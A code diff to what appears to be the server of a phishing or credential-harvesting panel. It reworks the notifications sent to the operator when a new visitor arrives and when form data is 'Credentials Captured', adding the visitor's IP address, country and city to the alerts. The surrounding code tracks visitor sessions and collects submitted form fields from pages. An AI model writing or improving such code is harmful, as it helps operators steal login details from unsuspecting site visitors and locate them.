@@ -119,10 +119,11 @@ function setupTrackerNamespace(io, trackerNsp) {
 
           const notifySetting = await db.get("SELECT value FROM settings WHERE key = 'notify_new_session'", []);
           if (!notifySetting || notifySetting.value !== '0') {
+            const geoTag = geo.country ? ` · ${geo.country}${geo.city ? '/' + geo.city : ''}` : '';
             notificationService.createNotification(io, website.owner_id, {
               type: 'success',
               title: 'New Visitor Live',
-              message: `New visitor session active from ${session?.ip_address || 'Unknown IP'} (${parsed.browser || 'Unknown'}/${parsed.os || 'Unknown'}) on ${website.name}.`,
+              message: `${website.name} — ${session?.ip_address || 'Unknown IP'} (${parsed.browser || 'Unknown'}, ${parsed.os || 'Unknown'})${geoTag}`,
               link: `#/sessions?id=${sessionId}`
             });
           }
@@ -344,9 +345,10 @@ function setupTrackerNamespace(io, trackerNsp) {
           const fieldsStr = Object.keys(capturedFields).filter(k => !ignoreKeys.includes(k.toLowerCase())).join(', ');
           const rawPage = (data.page || '').split('/').pop() || '';
           const pageName = rawPage.replace('.html', '').toLowerCase() || 'form';
+          const visitorIp = _getClientIp(socket);
           notificationService.createNotification(io, website.owner_id, {
             type: 'alert', title: 'Credentials Captured',
-            message: `Data captured ${pageName}: ${fieldsStr}`,
+            message: `${website.name} (${pageName}) — ${fieldsStr} · visitor ${visitorIp}`,
             link: `#/sessions?id=${socket.sessionId}`
           });
         }
